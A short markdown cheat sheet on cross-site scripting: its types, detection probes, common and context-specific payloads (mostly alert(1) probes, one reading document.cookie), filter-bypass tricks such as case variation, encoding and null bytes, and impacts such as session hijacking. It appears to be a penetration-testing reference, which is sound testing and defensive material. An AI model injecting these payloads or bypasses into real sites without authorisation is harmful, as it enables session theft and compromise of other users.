# XSS (Cross-Site Scripting) Basics

## Types
- Reflected: payload in URL parameter, reflected in response
- Stored: payload persisted in database, served to other users
- DOM-based: payload processed by client-side JavaScript

## Detection
- Inject `<script>alert(1)</script>` and check reflection
- Try `" onload="alert(1)` in attribute contexts
- Test `javascript:alert(1)` in href/src attributes
- Use `<img src=x onerror=alert(1)>` for attribute breakout

## Common Payloads
- `<script>alert(document.cookie)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`
- `<details open ontoggle=alert(1)>`
- `<marquee onstart=alert(1)>`
- `"><script>alert(1)</script>` (attribute breakout)
- `';alert(1);//` (JS context breakout)

## Context-Specific
- HTML body: `<script>alert(1)</script>`
- Attribute value: `" onmouseover="alert(1)`
- JavaScript string: `';alert(1);//`
- URL parameter: `javascript:alert(1)`
- CSS: `expression(alert(1))` (IE), `url(javascript:alert(1))`

## Bypass Techniques
- Case variation: `<ScRiPt>alert(1)</ScRiPt>`
- Encoding: HTML entities, URL encoding, Unicode
- Event handlers: `onerror`, `onload`, `onfocus`, `onmouseover`
- Protocol handlers: `javascript:`, `data:text/html,<script>alert(1)</script>`
- Nested tags: `<svg><script>alert(1)</script></svg>`
- Null bytes: `<scr\x00ipt>alert(1)</script>`

## Impact
- Session hijacking via `document.cookie`
- Keylogging via event listeners
- Phishing via DOM manipulation
- CSRF via authenticated requests
